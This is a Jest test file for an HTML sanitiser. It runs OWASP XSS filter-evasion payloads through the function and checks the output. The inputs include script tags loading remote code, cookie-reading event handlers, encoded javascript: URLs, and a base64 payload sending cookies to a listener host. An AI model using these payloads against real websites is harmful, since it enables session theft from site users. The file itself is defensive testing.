/// <reference types="jest" />

import { cleanHTML } from './html-cleanser'

describe('cleanHTML', () => {
  it('returns empty string if no input is provided', () => {
    const actual = [cleanHTML(undefined), cleanHTML('')]
    expect(actual).toEqual(['', ''])
  })
  it('returns allowed default tags', () => {
    const actual = cleanHTML('<i>asdf</i><em>asdf</em>')
    expect(actual).toBe('<i>asdf</i><em>asdf</em>')
  })
  it('returns allowed passed tags', () => {
    const actual = cleanHTML('<i>asdf</i><p>asdf</p>', '<i><p>')
    expect(actual).toBe('<i>asdf</i><p>asdf</p>')
  })
  it('throws error on invalid tags', () => {
    expect(() => cleanHTML('<i>asdf</i><p>asdf</p>', '<script>')).toThrow()
  })
  it('no HTML allowed', () => {
    const actual = cleanHTML('<i>asdf</i><p>asdf</p>', '')
    expect(actual).toBe('asdfasdf')
  })
  // Many of the OWASP tests ahead:
  // https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
  it('Basic XSS Test Without Filter Evasion', () => {
    const actual = cleanHTML('<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>')
    expect(actual).toBe('')
  })
  it('XSS Locator (Polygot)', () => {
    const actual = cleanHTML(
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    )
    expect(actual).toBe('')
  })
  it('Image XSS using the JavaScript directive', () => {
    const actual = cleanHTML('<IMG SRC="javascript:alert(\'XSS\');">')
    expect(actual).toBe('')
  })
  it('No quotes and no semicolon', () => {
    const actual = cleanHTML("<IMG SRC=javascript:alert('XSS')>")
    expect(actual).toBe('')
  })
  it('Case insensitive XSS attack vector', () => {
    const actual = cleanHTML("<IMG SRC=JaVaScRiPt:alert('XSS')>")
    expect(actual).toBe('')
  })
  it('HTML entities', () => {
    const actual = cleanHTML(
      '<IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)>'
    )
    expect(actual).toBe('')
  })
  it('Grave accent obfuscation', () => {
    const actual = cleanHTML(
      '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'
    )
    expect(actual).toBe('')
  })
  it('Malformed A tags', () => {
    const actual = cleanHTML(
      '<a onmouseover="alert(document.cookie)">xxs link</a>'
    )
    expect(actual).toBe('xxs link')
  })
  it('Malformed IMG tags', () => {
    const actual = cleanHTML('<IMG """><SCRIPT>alert("XSS")</SCRIPT>">')
    expect(actual).toBe('alert("XSS")">')
  })
  it('fromCharCode', () => {
    const actual = cleanHTML(
      '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
    )
    expect(actual).toBe('')
  })
  it('Default SRC tag to get past filters that check SRC domain', () => {
    const actual = cleanHTML('<IMG SRC=# onmouseover="alert(\'xxs\')">')
    expect(actual).toBe('')
  })
  it('Default SRC tag by leaving it empty', () => {
    const actual = cleanHTML('<IMG SRC= onmouseover="alert(\'xxs\')">')
    expect(actual).toBe('')
  })
  it('Default SRC tag by leaving it out entirely', () => {
    const actual = cleanHTML('<IMG onmouseover="alert(\'xxs\')">')
    expect(actual).toBe('')
  })
  it('On error alert', () => {
    const actual = cleanHTML(
      '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'
    )
    expect(actual).toBe('')
  })
  it('IMG onerror and javascript alert encode', () => {
    const actual = cleanHTML(
      '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">'
    )
    expect(actual).toBe('')
  })
  it('Decimal HTML character references', () => {
    const actual = cleanHTML(
      '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'
    )
    expect(actual).toBe('')
  })
  it('Decimal HTML character references without trailing semicolons', () => {
    const actual = cleanHTML(
      '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>'
    )
    expect(actual).toBe('')
  })
  it('Hexadecimal HTML character references without trailing semicolons', () => {
    const actual = cleanHTML(
      '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
    )
    expect(actual).toBe('')
  })
  it('Embedded tab', () => {
    const actual = cleanHTML('<IMG SRC="jav	ascript:alert(\'XSS\');">')
    expect(actual).toBe('')
  })
  it('Embedded Encoded tab', () => {
    const actual = cleanHTML('<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">')
    expect(actual).toBe('')
  })
  it('Embedded newline to break up XSS', () => {
    const actual = cleanHTML('<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">')
    expect(actual).toBe('')
  })
  it('Embedded carriage return to break up XSS', () => {
    const actual = cleanHTML('<IMG SRC="jav&#x0D;ascript:alert();">')
    expect(actual).toBe('')
  })
  it('Spaces and meta chars before the JavaScript in images for XSS', () => {
    const actual = cleanHTML('<IMG SRC=" &#14;  javascript:alert(\'XSS\');">')
    expect(actual).toBe('')
  })
  it('Non-alpha-non-digit XSS', () => {
    const actual = cleanHTML(
      '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>'
    )
    expect(actual).toBe('')
    const rnakeFuzzer = cleanHTML(
      '<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>'
    )
    expect(rnakeFuzzer).toBe('')
  })
  it('Extraneous open brackets', () => {
    const actual = cleanHTML('<<SCRIPT>alert("XSS");//<</SCRIPT>')
    expect(actual).toBe('')
  })
  it('No closing script tags', () => {
    const actual = cleanHTML('<SCRIPT SRC=//xss.rocks/.j>')
    expect(actual).toBe('')
  })
  it('Protocol resolution in script tags', () => {
    const actual = cleanHTML('<SCRIPT SRC=http://xss.rocks/xss.js?< B >')
    expect(actual).toBe('')
  })
  it('Half open HTML/JavaScript XSS vector', () => {
    const actual = cleanHTML('<IMG SRC="javascript:alert(\'XSS\')"')
    expect(actual).toBe('')
  })
  it('Double open angle brackets', () => {
    const actual = cleanHTML('<iframe src=http://xss.rocks/scriptlet.html <')
    expect(actual).toBe('')
  })
  it('Escaping JavaScript escapes', () => {
    const actual = cleanHTML("\";alert('XSS');//")
    expect(actual).toBe("\";alert('XSS');//")
  })
  it('End title tag', () => {
    const actual = cleanHTML('</TITLE><SCRIPT>alert("XSS");</SCRIPT>')
    expect(actual).toBe('alert("XSS");')
  })
  it('INPUT image', () => {
    const actual = cleanHTML(
      '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">'
    )
    expect(actual).toBe('')
  })
  it('BODY image', () => {
    const actual = cleanHTML('<BODY BACKGROUND="javascript:alert(\'XSS\')">')
    expect(actual).toBe('')
  })
  it('IMG Dynsrc', () => {
    const actual = cleanHTML('<IMG DYNSRC="javascript:alert(\'XSS\')">')
    expect(actual).toBe('')
  })
  it('IMG lowsrc', () => {
    const actual = cleanHTML('<IMG LOWSRC="javascript:alert(\'XSS\')">')
    expect(actual).toBe('')
  })
  it('List-style-image', () => {
    const actual = cleanHTML(
      '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>'
    )
    expect(actual).toBe('li {list-style-image: ");}XSS')
  })
  it('VBscript in an image', () => {
    const actual = cleanHTML('<IMG SRC=\'vbscript:msgbox("XSS")\'>')
    expect(actual).toBe('')
  })
  it('SVG object tag', () => {
    const actual = cleanHTML(`<svg/onload=alert('XSS')>`)
    expect(actual).toBe('')
  })
  it('ECMAScript 6', () => {
    const actual = cleanHTML('Set.constructor`alert\x28document.domain\x29```')
    expect(actual).toBe('alert\x28document.domain\x29```')
  })
  it('BODY tag', () => {
    const actual = cleanHTML(`<BODY ONLOAD=alert('XSS')>`)
    expect(actual).toBe('')
  })
  it('BGSOUND', () => {
    const actual = cleanHTML(`<BGSOUND SRC="javascript:alert('XSS');">`)
    expect(actual).toBe('')
  })
  it('& JavaScript includes', () => {
    const actual = cleanHTML(`<BR SIZE="&{alert('XSS')}">`)
    expect(actual).toBe('')
  })
  it('STYLE sheet', () => {
    const actual = cleanHTML(
      `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
    )
    expect(actual).toBe('')
  })
  it('Remote style sheet', () => {
    const actual = cleanHTML(
      '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">'
    )
    expect(actual).toBe('')
  })
  it('Remote style sheet part 2', () => {
    const actual = cleanHTML(
      "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>"
    )
    expect(actual).toBe(`@import'http://xss.rocks/xss.css';`)
  })
  it('Remote style sheet part 3', () => {
    const actual = cleanHTML(
      '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">'
    )
    expect(actual).toBe(`; REL=stylesheet">`)
  })
  it('Remote style sheet part 4', () => {
    const actual = cleanHTML(
      '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>'
    )
    expect(actual).toBe('BODY{-moz-binding:}')
  })
  it('STYLE tags with broken up JavaScript for XSS', () => {
    const actual = cleanHTML(
      '<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>'
    )
    expect(actual).toBe('@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';')
  })
  it('STYLE attribute using a comment to break up expression', () => {
    const actual = cleanHTML(
      '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">'
    )
    expect(actual).toBe('')
  })
  it('STYLE tag using background-image', () => {
    const actual = cleanHTML(
      '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>'
    )
    expect(actual).toBe('.XSS{background-image:");}')
  })
  it('STYLE tag using background', () => {
    const actual = cleanHTML(
      '<STYLE type="text/css">BODY{background:url("javascript:alert\'XSS\'")}</STYLE>'
    )
    expect(actual).toBe('BODY{background:}')
  })
  it('Anonymous HTML with STYLE attribute', () => {
    const actual = cleanHTML('<XSS STYLE="xss:expression(alert(\'XSS\'))">')
    expect(actual).toBe('')
  })
  it('Local htc file', () => {
    const actual = cleanHTML('<XSS STYLE="behavior: url(xss.htc);">')
    expect(actual).toBe('')
  })
  it('US-ASCII encoding', () => {
    const actual = cleanHTML('¼script¾alert(¢XSS¢)¼/script¾')
    expect(actual).toBe('¼script¾alert(¢XSS¢)¼/script¾')
  })
  it('META', () => {
    const actual = [
      cleanHTML(
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">'
      ),
      cleanHTML(
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">'
      ),
      cleanHTML(
        '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">'
      )
    ]
    expect(actual).toEqual(Array(actual.length).fill(''))
  })
  it('IFRAME', () => {
    const actual = cleanHTML(
      '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>'
    )
    expect(actual).toBe('')
  })
  it('IFRAME Event based', () => {
    const actual = cleanHTML(
      '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>'
    )
    expect(actual).toBe('')
  })
  it('FRAME', () => {
    const actual = cleanHTML(
      '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>'
    )
    expect(actual).toBe('')
  })
  it('TABLE', () => {
    const actual = [
      cleanHTML('<TABLE BACKGROUND="javascript:alert(\'XSS\')">'),
      cleanHTML('<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">')
    ]
    expect(actual).toEqual(Array(actual.length).fill(''))
  })
  it('DIV', () => {
    const actual = [
      cleanHTML(
        '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">'
      ),
      cleanHTML(
        '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">'
      )
    ]
    expect(actual).toEqual(Array(actual.length).fill(''))
  })
  it('Downlevel-Hidden block', () => {
    const actual = cleanHTML(
      `<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`
    )
    expect(actual).toBe('')
  })
  it('BASE tag', () => {
    const actual = cleanHTML('<BASE HREF="javascript:alert(\'XSS\');//">')
    expect(actual).toBe('')
  })
  it('OBJECT tag', () => {
    const actual = cleanHTML(
      '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'
    )
    expect(actual).toBe('')
  })
  it('Using an EMBED tag you can embed a Flash movie that contains XSS', () => {
    const actual = cleanHTML(
      '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>'
    )
    expect(actual).toBe('')
  })
  it('You can EMBED SVG which can contain your XSS vector', () => {
    const actual = cleanHTML(
      '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'
    )
    expect(actual).toBe('')
  })
  it('XML data island with CDATA obfuscation', () => {
    const actual = cleanHTML(
      '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
    )
    expect(actual).toBe('<I></I><SPAN ></SPAN>')
  })
  it('Locally hosted XML with embedded JavaScript that is generated using an XML data island', () => {
    const actual = cleanHTML(
      '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>'
    )
    expect(actual).toBe('<SPAN ></SPAN>')
  })
  it('HTML+TIME in XML', () => {
    const actual = cleanHTML(
      '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>'
    )
    expect(actual).toBe(
      ':namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2">alert("XSS")">'
    )
  })
  it('Assuming you can only fit in a few characters and it filters against ".js"', () => {
    const actual = cleanHTML('<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>')
    expect(actual).toBe('')
  })
  it('SSI (Server Side Includes)', () => {
    const actual = cleanHTML(
      '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://xss.rocks/xss.js></SCRIPT>\'"-->'
    )
    expect(actual).toBe('')
  })
  it('IMG Embedded commands', () => {
    const actual = cleanHTML(
      '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">'
    )
    expect(actual).toBe('')
  })
  it('Cookie manipulation', () => {
    const actual = cleanHTML(
      `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`
    )
    expect(actual).toBe(`alert('XSS')">`)
  })
  it('UTF-7 encoding', () => {
    const actual = cleanHTML(
      '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-'
    )
    expect(actual).toBe(`+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`)
  })
  it('XSS using HTML quote encapsulation', () => {
    const actual = [
      '<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>',
      '<SCRIPT =">" SRC="http://xss.rocks/xss.js"></SCRIPT>',
      '<SCRIPT a=">" \'\' SRC="http://xss.rocks/xss.js"></SCRIPT>',
      '<SCRIPT "a=\'>\'" SRC="http://xss.rocks/xss.js"></SCRIPT>',
      '<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>',
      `<SCRIPT a=">'>" SRC="http://xss.rocks/xss.js"></SCRIPT>`,
      `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>`
    ].map(i => cleanHTML(i))
    expect(actual).toEqual([
      '" >',
      '" >',
      "\" '' >",
      '\'" >',
      '` >',
      '\'>" >',
      '("PT >'
    ])
  })
  it('URL string evasion', () => {
    const actual = [
      '<A HREF="http://66.102.7.147/">XSS</A>',
      '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
      '<A HREF="http://1113982867/">XSS</A>',
      '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
      '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
      `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`,
      `<A HREF="h\ntt	p://6	6.000146.0x7.147/">XSS</A>`,
      '<A HREF="//www.google.com/">XSS</A>',
      '<A HREF="//google">XSS</A>',
      '<A HREF="http://ha.ckers.org@google">XSS</A>',
      '<A HREF="http://google:ha.ckers.org">XSS</A>',
      '<A HREF="http://google.com/">XSS</A>',
      '<A HREF="http://www.google.com./">XSS</A>',
      `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
      '<A HREF="http://www.google.com/ogle.com/">XSS</A>'
    ].map(i => cleanHTML(i))
    expect(actual).toEqual([
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      '',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS',
      'XSS'
    ])
  })
})
